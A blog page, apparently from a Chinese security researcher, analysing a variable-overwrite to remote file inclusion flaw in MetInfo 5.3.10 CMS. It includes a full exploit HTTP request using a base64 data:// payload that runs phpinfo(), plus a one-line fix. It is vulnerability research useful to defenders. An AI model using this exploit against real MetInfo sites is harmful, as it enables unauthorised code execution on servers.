@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      Metinfo5.3.10 CMS 命令执行 文件包含 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metinfo5.3.10 CMS 命令执行 文件包含 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta property="og:image" content="http://i1.piimg.com/567571/d5b5e87512c79439.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/4b634cadfa654e5f.png">
+<meta property="og:image" content="http://p1.bpimg.com/567571/029868dcb218554d.png">
+<meta property="og:updated_time" content="2017-03-14T12:18:45.221Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Metinfo5.3.10 CMS 命令执行 文件包含 | Hello,C">
+<meta name="twitter:description" content="0x00 MetInfoMetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。
+0x01 命令执行 文件包含命令执行：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/d5b5e87512c79439.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">Metinfo5.3.10 CMS 命令执行 文件包含</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-11-27" class="post-meta__date date">2016-11-27</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/php/">php</a>, <a class="tags-link" href="/tags/代码审计/">代码审计</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。</p>
+<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><a id="more"></a><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
+<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行</p>
+<pre><code>f($action==&quot;login&quot;){
+   $metinfo_admin_name     = $login_name;
+   $metinfo_admin_pass     = $login_pass;
+   $metinfo_admin_pass=md5($metinfo_admin_pass);
+   /*code*/
+   if($met_login_code==1){
+      require_once $depth.&apos;../include/captcha.class.php&apos;;
+      $Captcha= new  Captcha();
+      if(!$Captcha-&gt;CheckCode($code)){
+     echo(&quot;&lt;script type=&apos;text/javascript&apos;&gt;alert(&apos;$lang_logincodeerror&apos;);location.href=&apos;login.php?langset=$langset&apos;;&lt;/script&gt;&quot;);
+     exit;
+  }
+</code></pre><p>   }</p>
+<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
+<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。</p>
+<pre><code>error_reporting(E_ERROR | E_WARNING | E_PARSE);
+if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+if(!isset($depth))$depth=&apos;&apos;;
+$commonpath=$depth.&apos;include/common.inc.php&apos;;
+$commonpath=$admin_index?$commonpath:&apos;../&apos;.$commonpath;
+define(&apos;SQL_DETECT&apos;,1);
+</code></pre><p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
+<p>文件：include/common.inc.php：35</p>
+<pre><code>foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) {    // 遍历数组
+
+// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据
+    foreach($$_request as $_key =&gt; $_value) {           // 分别遍历该数据
+
+        $_key{0} != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);     // 对数据中的值进行转义
+        $_M[&apos;form&apos;][$_key] = daddslashes($_value,0,0,1);
+    }
+}
+</code></pre><p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
+<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：</p>
+<pre><code>&lt;?php
+
+$a=&apos;hello&apos;;
+foreach($_GET as $key =&gt; $value){
+$$key = $value;
+}
+print $a;
+?&gt;
+</code></pre><p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
+<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
+<p>本地文件包含用require_once来执行代码，但是</p>
+<pre><code>if($depth!=&apos;&apos;&amp;&amp;$depth!=&apos;../&apos;&amp;&amp;$depth!=&apos;../../&apos;){die();}
+</code></pre><p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题</p>
+<pre><code>require_once $depth.&apos;../include/captcha.class.php&apos;;
+</code></pre><p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
+<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
+<p>封装器解码之后代码的样子</p>
+<p>&lt;?php phpinfo();exit();// ..þ)Üç^ýÆ©µÈZ.rV¬s.php</p>
+<p>这样我们构造exp进行测试，前提后台开启了登录验证码：</p>
+<pre><code>POST /MetInfo_5.3.10/admin/login/login_check.php?langset=cn&amp;depth=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 83
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://127.0.0.1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://127.0.0.1/MetInfo_5.3.10/admin/login/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: _ga=GA1.1.1522517218.1476456267; tablepage_json=0%7Csystem%2Cnews%2Cdonews_info; ft127001=0; recordurl=%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252F%2Chttp%253A%252F%252F127.0.0.1%252FMetInfo_5.3.10%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.0.0.1%2FMetInfo_5.3.10%2Fadmin%2F; met_capcha=1f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq
+Connection: close
+
+action=login&amp;login_name=admin&amp;login_pass=123456&amp;code=8CAA&amp;Submit=%E7%99%BB%E5%BD%95
+</code></pre><p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
+<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
+<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
